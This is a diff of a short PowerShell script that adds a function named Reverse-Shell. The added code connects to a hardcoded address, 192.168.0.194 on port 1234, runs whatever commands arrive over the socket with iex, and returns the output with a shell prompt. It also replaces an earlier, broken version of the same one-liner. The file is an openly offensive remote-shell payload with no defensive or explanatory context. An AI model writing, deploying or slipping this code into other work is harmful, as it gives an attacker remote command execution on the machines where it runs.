@@ -1,26 +1,19 @@
 
-
-
-function main {
+function Reverse-Shell {
     [CmdletBinding()]
-    
     param (
-        [string]$TARGET_IP
-	[string]$TARGET_PORT
+        $TargetIP,
+        $TargetPORT
     )
-    
-    begin{
-	# Nothin to show yet
-	echo "lol"
 
-    }
-    
     Clear-Host
-
-    # Main Payload
-    $client = New-Object System.Net.Sockers.TCPClient($TARGET_IP,$TARGET_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    $client = New-Object System.Net.Sockets.TCPClient(192.168.0.194,1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ' ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 }
 
+function main {
+    Clear-Host
+    Reverse-Shell $args
+}
 
 main $args
